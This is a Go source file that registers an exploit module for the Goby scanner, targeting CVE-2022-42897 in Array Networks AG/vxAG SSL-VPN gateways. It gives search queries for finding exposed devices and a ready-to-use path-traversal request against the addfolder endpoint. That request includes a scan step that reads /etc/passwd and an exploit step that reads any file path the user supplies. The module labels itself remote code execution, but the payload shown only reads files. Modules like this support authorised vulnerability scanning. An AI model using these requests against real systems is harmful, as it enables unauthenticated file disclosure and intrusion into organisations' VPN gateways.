package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Array Networks AG/vxAG RCE (CVE-2022-42897)",
    "Description": "<p>Array Networks AG/vxAG is an Array SSL-VPN gateway product of Array Networks in the United States.</p><p>Array Networks AG/vxAG with ArrayOS AG prior to 9.4.0.469 has a security vulnerability that allows an unauthenticated attacker to achieve command injection, resulting in privilege escalation and control over the system.</p>",
    "Product": "Array-VPN",
    "Homepage": "https://arraynetworks.com/",
    "DisclosureDate": "2023-01-03",
    "Author": "corp0ra1",
    "FofaQuery": "banner=\"/prx/000/http\" || header=\"/prx/000/http\" || body=\"an_util.js\"",
    "GobyQuery": "banner=\"/prx/000/http\" || header=\"/prx/000/http\" || body=\"an_util.js\"",
    "Level": "3",
    "Impact": "<p>Array Networks AG/vxAG with ArrayOS AG prior to 9.4.0.469 has a security vulnerability that allows an unauthenticated attacker to achieve command injection, resulting in privilege escalation and control over the system.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://support.arraynetworks.net/prx/001/http/supportportal.arraynetworks.net/fieldnotices.html\">https://support.arraynetworks.net/prx/001/http/supportportal.arraynetworks.net/fieldnotices.html</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "../../../../../../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/prx/000/http/localhost/client_sec/../addfolder",
                "follow_redirect": false,
                "header": {
                    "X_an_fileshare": "uname=t;password=t;sp_uname=t;flags=c3248;fshare_template=../../../../../../../../../../etc/passwd"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:.*:0:0:",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "AN_global_var_init",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/prx/000/http/localhost/client_sec/../addfolder",
                "follow_redirect": false,
                "header": {
                    "X_an_fileshare": "uname=t;password=t;sp_uname=t;flags=c3248;fshare_template={{{filePath}}}"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2022-42897"
    ],
    "CNNVD": [
        "CNNVD-202210-770"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Array Networks AG/vxAG 远程代码执行漏洞（CVE-2022-42897）",
            "Product": "Array-VPN",
            "Description": "<p>Array Networks AG/vxAG是美国安瑞科技（Array Networks）公司的一款 Array SSL-VPN 网关产品。<br></p><p>Array Networks AG/vxAG with ArrayOS AG 9.4.0.469之前的版本存在安全漏洞，该漏洞源于其允许未经身份验证的攻击者实现命令注入，导致权限升级和对系统的控制。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://support.arraynetworks.net/prx/001/http/supportportal.arraynetworks.net/fieldnotices.html\">https://support.arraynetworks.net/prx/001/http/supportportal.arraynetworks.net/fieldnotices.html</a><br></p>",
            "Impact": "<p>Array Networks AG/vxAG with ArrayOS AG 9.4.0.469之前的版本存在安全漏洞，该漏洞源于其允许未经身份验证的攻击者实现命令注入，导致权限升级和对系统的控制。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Array Networks AG/vxAG RCE (CVE-2022-42897)",
            "Product": "Array-VPN",
            "Description": "<p>Array Networks AG/vxAG is an Array SSL-VPN gateway product of Array Networks in the United States.<br></p><p>Array Networks AG/vxAG with ArrayOS AG prior to 9.4.0.469 has a security vulnerability that allows an unauthenticated attacker to achieve command injection, resulting in privilege escalation and control over the system.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://support.arraynetworks.net/prx/001/http/supportportal.arraynetworks.net/fieldnotices.html\">https://support.arraynetworks.net/prx/001/http/supportportal.arraynetworks.net/fieldnotices.html</a><br></p>",
            "Impact": "<p>Array Networks AG/vxAG with ArrayOS AG prior to 9.4.0.469 has a security vulnerability that allows an unauthenticated attacker to achieve command injection, resulting in privilege escalation and control over the system.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7396"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
